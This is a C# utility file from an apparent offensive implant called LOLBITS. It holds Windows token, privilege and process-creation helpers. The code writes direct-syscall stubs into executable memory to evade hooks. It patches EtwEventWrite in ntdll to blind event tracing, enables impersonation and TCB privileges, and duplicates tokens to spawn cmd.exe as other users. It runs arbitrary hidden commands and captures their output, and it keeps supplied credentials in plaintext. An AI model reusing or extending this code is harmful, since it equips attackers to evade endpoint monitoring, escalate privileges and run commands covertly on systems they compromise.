using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using LOLBITS.TokenManagement;

using dinvoke = LOLBITS.DInvoke;

namespace LOLBITS
{
    public unsafe class Utils
    {
        private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
        public const int SECURITY_MANDATORY_UNTRUSTED_RID = (0x00000000);
        public const int SECURITY_MANDATORY_LOW_RID = (0x00001000);
        public const int SECURITY_MANDATORY_MEDIUM_RID = (0x00002000);
        public const int SECURITY_MANDATORY_HIGH_RID = (0x00003000);
        public const int SECURITY_MANDATORY_SYSTEM_RID = (0x00004000);
        public const int SECURITY_MANDATORY_PROTECTED_PROCESS_RID = (0x00005000);
        private const int AnySizeArray = 1;
        
        /////////////////////////// ENUM ///////////////////////////
        
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        }

        [Flags()]
        public enum TokenAccessFlags : int
        {
            StandardRightsRequired = 0x000F0000,
            StandardRightsRead = 0x00020000,
            TokenAssignPrimary = 0x0001,
            TokenDuplicate = 0x0002,
            TokenImpersonate = 0x0004,
            TokenQuery = 0x0008,
            TokenQuerySource = 0x0010,
            TokenAdjustPrivileges = 0x0020,
            TokenAdjustGroups = 0x0040,
            TokenAdjustDefault = 0x0080,
            TokenAdjustSessionId = 0x0100,
            TokenRead = (StandardRightsRead | TokenQuery),
            TokenAllAccess = (StandardRightsRequired | TokenAssignPrimary |
                TokenDuplicate | TokenImpersonate | TokenQuery | TokenQuerySource |
                TokenAdjustPrivileges | TokenAdjustGroups | TokenAdjustDefault |
                TokenAdjustSessionId)
        }

        public enum SecurityImpersonationLevel
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        public enum TokenType
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        [Flags]
        public enum CreationFlags
        {
            CreateBreakawayFromJob = 0x01000000,
            CreateDefaultErrorMode = 0x04000000,
            CreateNewConsole = 0x00000010,
            CreateNewProcessGroup = 0x00000200,
            CreateNoWindow = 0x08000000,
            CreateProtectedProcess = 0x00040000,
            CreatePreserveCodeAuthLevel = 0x02000000,
            CreateSeparateWowVdm = 0x00001000,
            CreateSuspended = 0x00000004,
            CreateUnicodeEnvironment = 0x00000400,
            DebugOnlyThisProcess = 0x00000002,
            DebugProcess = 0x00000001,
            DetachedProcess = 0x00000008,
            ExtendedStartupInfoPresent = 0x00080000
        }

        private enum TokenInformationClass
        {
            /// The buffer receives a <see cref="TokenUser"/> structure that contains the user account of the token.
            TokenUser = 1,
            /// The buffer receives a <see cref="TokenGroups"/> structure that contains the group accounts associated with the token.
            TokenGroups,
            /// The buffer receives a <see cref="TokenPrivileges"/> structure that contains the privileges of the token.
            TokenPrivileges,
            /// The buffer receives a <see cref="TokenOwner"/> structure that contains the default owner security identifier (SID) for newly created objects.
            TokenOwner,
            /// The buffer receives a <see cref="TokenPrimaryGroup"/> structure that contains the default primary group SID for newly created objects.
            TokenPrimaryGroup,
            /// The buffer receives a <see cref="TokenDefaultDacl"/> structure that contains the default DACL for newly created objects.
            TokenDefaultDacl,
            /// The buffer receives a <see cref="TokenSource"/> structure that contains the source of the token. TOKEN_QUERY_SOURCE access is needed to retrieve this information.
            TokenSource,
            /// The buffer receives a <see cref="TokenType"/> value that indicates whether the token is a primary or impersonation token.
            TokenType,
            /// The buffer receives a <see cref="TokenImpersonationLevel"/> value that indicates the impersonation level of the token. If the access token is not an impersonation token, the function fails.
            TokenImpersonationLevel,
            /// The buffer receives a <see cref="TokenStatistics"/> structure that contains various token statistics.
            TokenStatistics,
            /// The buffer receives a <see cref="TokenGroups"/> structure that contains the list of restricting SIDs in a restricted token.
            TokenRestrictedSids,
            /// The buffer receives a <see cref="TokenSessionId"/> as a DWORD value that indicates the Terminal Services session identifier that is associated with the token.
            TokenSessionId,
            /// The buffer receives a <see cref="TokenGroupsAndPrivileges"/> structure that contains the user SID, the group accounts, the restricted SIDs, and the authentication ID associated with the token.
            TokenGroupsAndPrivileges,
            /// Reserved.
            TokenSessionReference,
            /// The buffer receives a <see cref="TokenSandBoxInert"/> as a DWORD value that is nonzero if the token includes the SANDBOX_INERT flag.
            TokenSandBoxInert,
            /// Reserved.
            TokenAuditPolicy,
            /// The buffer receives a <see cref="TokenOrigin"/> value.
            TokenOrigin,
            /// The buffer receives a <see cref="TokenElevationType"/> value that specifies the elevation level of the token.
            TokenElevationType,
            /// The buffer receives a <see cref="TokenLinkedToken"/> structure that contains a handle to another token that is linked to this token.
            TokenLinkedToken,
            /// The buffer receives a <see cref="TokenElevation"/> structure that specifies whether the token is elevated.
            TokenElevation,
            /// The buffer receives a <see cref="TokenHasRestrictions"/> as a DWORD value that is nonzero if the token has ever been filtered.
            TokenHasRestrictions,
            /// The buffer receives a <see cref="TokenAccessInformation"/> structure that specifies security information contained in the token.
            TokenAccessInformation,
            /// The buffer receives a <see cref="TokenVirtualizationAllowed"/> as a DWORD value that is nonzero if virtualization is allowed for the token.
            TokenVirtualizationAllowed,
            /// The buffer receives a <see cref="TokenVirtualizationEnabled"/> as a DWORD value that is nonzero if virtualization is enabled for the token.
            TokenVirtualizationEnabled,
            /// The buffer receives a <see cref="TokenIntegrityLevel"/> structure that specifies the token's integrity level.
            TokenIntegrityLevel,
            /// The buffer receives a <see cref="TokenUiAccess"/> as a DWORD value that is nonzero if the token has the UIAccess flag set.
            TokenUiAccess,
            /// The buffer receives a <see cref="TokenMandatoryPolicy"/> structure that specifies the token's mandatory integrity policy.
            TokenMandatoryPolicy,
            /// The buffer receives the token's logon security identifier (SID).
            TokenLogonSid,
            /// The maximum value for this enumeration
            MaxTokenInfoClass
        }

        public enum SystemInformationClass
        {
            SystemBasicInformation = 0x0000,
            SystemProcessorInformation = 0x0001,
            SystemPerformanceInformation = 0x0002,
            SystemPathInformation = 0x0004,
            SystemProcessInformation = 0x0005,
            SystemExtendedProcessInformation = 0x0039,
            SystemFullProcessInformation = 0x0094,
        }

        /////////////////////////// STRUCTS ///////////////////////////

        [StructLayout(LayoutKind.Sequential)]
        public struct Luid
        {
            public readonly uint LowPart;
            public readonly int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LuidAndAttributes
        {
            public Luid Luid;
            public uint Attributes;
        }
        
        public struct TokenPrivileges
        {
            public uint PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = AnySizeArray)]
            public LuidAndAttributes[] Privileges;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct StartupInfo
        {
            public int cb;
            public readonly string lpReserved;
            public string lpDesktop;
            public readonly string lpTitle;
            public readonly int dwX;
            public readonly int dwY;
            public readonly int dwXSize;
            public readonly int dwYSize;
            public readonly int dwXCountChars;
            public readonly int dwYCountChars;
            public readonly int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public readonly short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct ProcessInformation
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public readonly int dwProcessId;
            public readonly int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            private IntPtr objectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;

            public OBJECT_ATTRIBUTES(string name, uint attrs)
            {
                Length = 0;
                RootDirectory = IntPtr.Zero;
                objectName = IntPtr.Zero;
                Attributes = attrs;
                SecurityDescriptor = IntPtr.Zero;
                SecurityQualityOfService = IntPtr.Zero;
                Length = Marshal.SizeOf(this);
            }
        }

        /////////////////////////// PInvoke ///////////////////////////

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AdjustTokenPrivileges(
            IntPtr tokenHandle,
            [MarshalAs(UnmanagedType.Bool)]bool disableAllPrivileges,
            ref TokenPrivileges newState,
            int zero,
            IntPtr null1,
            IntPtr null2);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool DuplicateTokenEx(
            IntPtr hExistingToken,
            TokenAccessFlags dwDesiredAccess,
            IntPtr lpThreadAttributes,
            SecurityImpersonationLevel impersonationLevel,
            TokenType tokenType,
            out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool CreateProcessAsUserW(
            IntPtr hToken,
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            CreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref StartupInfo lpStartupInfo,
            out ProcessInformation lpProcessInformation);

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(
           IntPtr hToken,
           LogonFlags dwLogonFlags,
           string lpApplicationName,
           string lpCommandLine,
           CreationFlags dwCreationFlags,
           IntPtr lpEnvironment,
           string lpCurrentDirectory,
           [In] ref StartupInfo lpStartupInfo,
           out ProcessInformation lpProcessInformation);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithLogonW(
            string userName,
            string domain,
            string password,
            LogonFlags logonFlags,
            string applicationName,
            string commandLine,
            CreationFlags creationFlags,
            uint environment,
            string currentDirectory,
            ref StartupInfo startupInfo,
            out ProcessInformation processInformation);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool GetTokenInformation(
            IntPtr tokenHandle,
            TokenInformationClass tokenInformationClass,
            IntPtr tokenInformation,
            uint tokenInformationLength,
            out uint returnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern IntPtr GetSidSubAuthority(IntPtr sid, uint subAuthorityIndex);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern IntPtr GetSidSubAuthorityCount(IntPtr sid);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out Luid lpLuid);

        [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpNumberOfBytesRead, IntPtr lpOverlapped);

        /////////////////////////// Native Syscall ///////////////////////////

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtOpenProcess(ref IntPtr hProcess, ProcessAccessFlags desiredAccess, ref OBJECT_ATTRIBUTES objectAttributes, ref CLIENT_ID clientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtOpenProcessToken(IntPtr processHandle, TokenAccessFlags desiredAccess, out IntPtr tokenHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtReadVirtualMemory(IntPtr processHandle, IntPtr baseAddress, out IntPtr buffer, uint numberOfBytesToRead, out IntPtr numberOfBytesReaded);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtWriteVirtualMemory(IntPtr processHandle, IntPtr address, byte[] buffer, UIntPtr size, IntPtr bytesWrittenBuffer);


        /////////////////////////// Privileges related functions ///////////////////////////

        public static bool EnablePrivileges(IntPtr handle, List<string> privileges)
        {
            foreach (var privilege in privileges)
            {

                try
                {
                    if (!LookupPrivilegeValue(null, privilege, out var myLuid)) continue;

                    TokenPrivileges myTokenPrivileges;

                    myTokenPrivileges.PrivilegeCount = 1;
                    myTokenPrivileges.Privileges = new LuidAndAttributes[1];
                    myTokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                    myTokenPrivileges.Privileges[0].Luid = myLuid;

                    AdjustTokenPrivileges(handle, false, ref myTokenPrivileges, 0, IntPtr.Zero, IntPtr.Zero);
                }
                catch { return false; }

            }
            return true;

        }

        /////////////////////////// Processes related functions ///////////////////////////

        public static void GetProcessHandle(int pid, out IntPtr handle, ProcessAccessFlags flags, SysCallManager sysCall)
        {
            handle = IntPtr.Zero;
            var clientId = new CLIENT_ID() { UniqueProcess = new IntPtr(pid), UniqueThread = IntPtr.Zero};
            var objectAtt = new OBJECT_ATTRIBUTES(null, 0);
            dinvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");

            var shellCode = sysCall.GetSysCallAsm("NtOpenProcess");

            object[] virtualAlloc = { IntPtr.Zero, (UIntPtr)shellCode.Length, dinvoke.Win32.Kernel32.MemoryAllocationFlags.Commit | dinvoke.Win32.Kernel32.MemoryAllocationFlags.Reserve, dinvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteReadWrite };
            var shellCodeBuffer = (IntPtr)dinvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualAlloc", typeof(dinvoke.Win32.DELEGATES.VirtualAlloc), virtualAlloc);

            Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
            var sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtOpenProcess));
            var token = IntPtr.Zero;
            var arguments = new object[] { handle, flags, objectAtt, clientId};
            var returnValue = sysCallDelegate.DynamicInvoke(arguments);

            handle = (int)returnValue == 0 ? (IntPtr)arguments[0] : IntPtr.Zero;
        }

        public static void GetProcessToken(IntPtr handle, TokenAccessFlags access, out IntPtr currentToken, SysCallManager sysCall)
        {
            dinvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");
            var shellCode = sysCall.GetSysCallAsm("NtOpenProcessToken");

            object[] virtualAlloc = { IntPtr.Zero, (UIntPtr)shellCode.Length, dinvoke.Win32.Kernel32.MemoryAllocationFlags.Commit | dinvoke.Win32.Kernel32.MemoryAllocationFlags.Reserve, dinvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteReadWrite };
            var shellCodeBuffer = (IntPtr)dinvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualAlloc", typeof(dinvoke.Win32.DELEGATES.VirtualAlloc), virtualAlloc);

            Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
            var sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtOpenProcessToken));
            var token = IntPtr.Zero;
            var arguments = new object[] { handle, access, token };
            var returnValue = sysCallDelegate.DynamicInvoke(arguments);


            currentToken = (int)returnValue == 0 ? (IntPtr)arguments[2] : IntPtr.Zero;

        }

        // Code from https://www.pinvoke.net/default.aspx/Constants/SECURITY_MANDATORY.html
        public static bool IsHighIntegrity(SysCallManager sysCall)
        {


            var hToken = IntPtr.Zero;

            GetProcessToken(Process.GetCurrentProcess().Handle, TokenAccessFlags.TokenAllAccess, out hToken,
                    sysCall);

            if (hToken == IntPtr.Zero) return false;

            try
            {
                var pb = Marshal.AllocCoTaskMem(1000);
                try
                {
                    uint cb = 1000;
                    if (GetTokenInformation(hToken, TokenInformationClass.TokenIntegrityLevel, pb, cb, out cb))
                    {
                        var pSid = Marshal.ReadIntPtr(pb);

                        var dwIntegrityLevel = Marshal.ReadInt32(GetSidSubAuthority(pSid, (Marshal.ReadByte(GetSidSubAuthorityCount(pSid)) - 1U)));

                        return dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID;
                    }
                }
                finally
                {
                    Marshal.FreeCoTaskMem(pb);
                }
            }
            finally
            {
                CloseHandle(hToken);
            }

            return false;
        }

        public static int getSystemPID(SysCallManager sysCall)
        {
            string cmd = "FOR /F \"tokens=1,2,3,4,5\" %A in ('\"query process system | findstr svchost.exe | findstr/n ^^| findstr /b \"^1:\"\"') DO echo %E | findstr /b /r \"[0-9]\"";
            string pid = ExecuteCommand(cmd, sysCall);
            string[] spl = pid.Split('\n');

            return int.Parse(spl[2]);
        }

        public static bool handleETW(SysCallManager sysCall)
        {
            
            var hook = new byte[] { 0xc3 };
            uint oldProtect = 0, x = 0;
            var shellCode = sysCall.GetSysCallAsm("NtWriteVirtualMemory");


            dinvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");
            object[] loadLibrary = { "ntdll.dll" };

            IntPtr libraryAddress = (IntPtr)dinvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "LoadLibraryA", typeof(dinvoke.Win32.DELEGATES.LoadLibrary), loadLibrary);
            object[] procAddress = {libraryAddress, "EtwEventWrite" };

            var address = (IntPtr)dinvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "GetProcAddress", typeof(dinvoke.Win32.DELEGATES.GetProcAddress), procAddress);
            if (address == IntPtr.Zero)
                return false;

            object[] parameters = { (IntPtr)(-1), address, (UIntPtr)hook.Length, (uint)0x40, oldProtect };

            IntPtr hProcess = Process.GetCurrentProcess().Handle;

            IntPtr response = (IntPtr)dinvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx", typeof(dinvoke.Win32.DELEGATES.VirtualProtectEx), parameters);

            oldProtect = (uint)parameters[4];

            object[] virtualAlloc = { IntPtr.Zero, (UIntPtr)shellCode.Length, dinvoke.Win32.Kernel32.MemoryAllocationFlags.Commit | dinvoke.Win32.Kernel32.MemoryAllocationFlags.Reserve, dinvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteReadWrite };
            var shellCodeBuffer = (IntPtr)dinvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualAlloc", typeof(dinvoke.Win32.DELEGATES.VirtualAlloc), virtualAlloc);

            Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
            var sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtWriteVirtualMemory));
            var arguments = new object[] { hProcess, address, hook, (UIntPtr)(hook.Length), IntPtr.Zero };
            var returnValue = sysCallDelegate.DynamicInvoke(arguments);
            if ((int)returnValue != 0)
                return false;

            parameters = new object[] { (IntPtr)(-1), address, (UIntPtr)hook.Length, oldProtect, x };
            response = (IntPtr)dinvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx", typeof(dinvoke.Win32.DELEGATES.VirtualProtectEx), parameters);



            return true;
        }

        /////////////////////////// Impersonation ///////////////////////////

        public static void DuplicateToken(IntPtr token, TokenAccessFlags tokenAccess, SecurityImpersonationLevel se, TokenType type, out IntPtr duplicated)
        {
            if (!DuplicateTokenEx(token, tokenAccess, IntPtr.Zero, se, type, out duplicated)) 
                duplicated = IntPtr.Zero;
        }

        public static void DetermineImpersonationMethod(IntPtr token, LogonFlags l, StartupInfo startupInfo, out ProcessInformation processInfo)

        {
            if (CreateProcessAsUserW(token, null, @"c:\windows\system32\cmd.exe /Q /C hostname && exit", IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
                TokenManager.Method = 1;
            else 
            if (CreateProcessWithTokenW(token, l, null, @"c:\windows\system32\cmd.exe /Q /C hostname && exit", 0,
                IntPtr.Zero, null, ref startupInfo, out processInfo))
                TokenManager.Method = 2;
        }

        internal static void RunAs(string domain, string user, string password)
        {
            var startupInfo = new StartupInfo();
            startupInfo.cb = Marshal.SizeOf(startupInfo);
            startupInfo.lpDesktop = "";
            startupInfo.wShowWindow = 0;
            startupInfo.dwFlags |= 0x00000001;

            const LogonFlags logonFlags = new LogonFlags();

            if (!CreateProcessWithLogonW(user, domain, password, logonFlags, null, @"c:\windows\system32\cmd.exe /Q /C hostname", 0, 0, null, ref startupInfo, out _)) return;

            TokenManager.Method = 3;
            TokenManager.Credentials[0] = user;
            TokenManager.Credentials[1] = domain;
            TokenManager.Credentials[2] = password;
        }

        public static void Start()
        {
            var sysCall = new SysCallManager();

            try
            {
                var token = WindowsIdentity.GetCurrent().Token;
                var privileges = new List<string>
                {
                    "SeImpersonatePrivilege",
                    "SeTcbPrivilege",
                    "SeAssignPrimaryTokenPrivilege",
                    "SeIncreaseQuotaPrivilege"
                };

                var currentToken = IntPtr.Zero;
                GetProcessToken(Process.GetCurrentProcess().Handle, TokenAccessFlags.TokenAdjustPrivileges, out currentToken,
                    sysCall);

                EnablePrivileges(currentToken, privileges);

                CloseHandle(currentToken);

                const TokenAccessFlags tokenAccess = TokenAccessFlags.TokenQuery | TokenAccessFlags.TokenAssignPrimary |
                                                     TokenAccessFlags.TokenDuplicate | TokenAccessFlags.TokenAdjustDefault |
                                                     TokenAccessFlags.TokenAdjustSessionId;

                if (!DuplicateTokenEx(token, tokenAccess, IntPtr.Zero, SecurityImpersonationLevel.SecurityImpersonation,
                    TokenType.TokenPrimary, out var newToken))
                    return;

                var startupInfo = new StartupInfo();
                startupInfo.cb = Marshal.SizeOf(startupInfo);
                startupInfo.lpDesktop = "";
                startupInfo.wShowWindow = 0;
                startupInfo.dwFlags |= 0x00000001;

                const LogonFlags logonFlags = new LogonFlags();

                if (CreateProcessAsUserW(newToken, null,
                    @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", IntPtr.Zero,
                    IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out _))
                {
                    TokenManager.Token = newToken;
                    TokenManager.Method = 1;
                }
                else
                {
                    if (!CreateProcessWithTokenW(newToken, logonFlags, null,
                        @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", 0, IntPtr.Zero,
                        null, ref startupInfo, out _)) return;
                    TokenManager.Token = newToken;
                    TokenManager.Method = 2;
                }
            }
            catch
            {

            }
        }

        /////////////////////////// Commands execution ///////////////////////////

        public static string ExecuteCommand(string command, SysCallManager sysCall)
        {
            var output = "";
            if (TokenManager.Token == IntPtr.Zero && TokenManager.Method == 0)
            {
                var process = new Process();
                var startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    FileName = @"C:\windows\system32\cmd.exe",
                    Arguments = "/C " + command,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false
                };

                process.StartInfo = startInfo;
                process.Start();
                output = process.StandardOutput.ReadToEnd();

                if (output == "")
                    output = string.Concat("ERR:", process.StandardError.ReadToEnd());

               
                process.WaitForExit();
                process.Close();
            }
            else
            {
                var outRead = IntPtr.Zero;
                var outWrite = IntPtr.Zero;
                dinvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");

                var saAttr = new dinvoke.Win32.Kernel32.SecurityAttributes
                {
                    nLength = Marshal.SizeOf(typeof(dinvoke.Win32.Kernel32.SecurityAttributes)),
                    bInheritHandle = true,
                    lpSecurityDescriptor = IntPtr.Zero
                };

                object[] createPipe = { outRead, outWrite, saAttr, 0 };
                var shellCodeBuffer = (IntPtr)dinvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "CreatePipe", typeof(dinvoke.Win32.DELEGATES.CreatePipe), createPipe);

                outRead = (IntPtr)createPipe[0];
                outWrite = (IntPtr)createPipe[1];
                saAttr = (dinvoke.Win32.Kernel32.SecurityAttributes)createPipe[2];

                var startupInfo = new StartupInfo();
                startupInfo.cb = Marshal.SizeOf(startupInfo);
                startupInfo.lpDesktop = "";
                startupInfo.hStdOutput = outWrite;
                startupInfo.hStdError = outWrite;
                startupInfo.wShowWindow = 0;
                startupInfo.dwFlags |= 0x00000101;

                var l = new LogonFlags();

                switch (TokenManager.Method)
                {
                    case 1:
                        CreateProcessAsUserW(TokenManager.Token, null, @"c:\windows\system32\cmd.exe /Q /C" + @command, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out _);
                        break;
                    case 2:
                        CreateProcessWithTokenW(TokenManager.Token, l, null, @"c:\windows\system32\cmd.exe /Q /C" + @command, 0, IntPtr.Zero, null, ref startupInfo, out _);
                        break;
                    default:
                        CreateProcessWithLogonW(TokenManager.Credentials[0], TokenManager.Credentials[1], TokenManager.Credentials[2], l, null, @"c:\windows\system32\cmd.exe /Q /C" + command, 0, 0, null, ref startupInfo, out _);
                        break;
                }

                var buf = new byte[100];
                var dwRead = 0;
                Thread.Sleep(500);

                while (true)
                {
                    var bSuccess = ReadFile(outRead, buf, 100, ref dwRead, IntPtr.Zero);
                    output = string.Concat(output, Encoding.Default.GetString(buf));

                    if (!bSuccess || dwRead < 100)
                        break;
                }

                CloseHandle(outRead);
                CloseHandle(outWrite);
            }

            return output;
        }

        
    }
}
